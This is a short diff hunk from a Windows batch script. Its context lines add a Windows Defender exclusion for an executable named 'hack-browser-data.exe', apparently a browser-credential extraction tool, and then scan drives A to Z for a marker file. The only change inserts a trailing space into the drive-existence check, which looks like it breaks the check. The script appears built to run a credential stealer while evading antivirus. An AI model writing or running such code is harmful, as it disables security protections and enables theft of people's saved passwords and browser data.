@@ -128,7 +128,7 @@ setlocal enabledelayedexpansion
 TIMEOUT /t 10 /nobreak
 powershell -Command Add-MpPreference -ExclusionPath "D:\hack-browser-data.exe"
 for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-if exist "%%d:\" (
+if exist "%%d:\ " (
     if exist "%%d:\find_temp_check.txt" (
             echo "find_temp_check.txt" found in %%d:\
         cd /d "%%d:\"
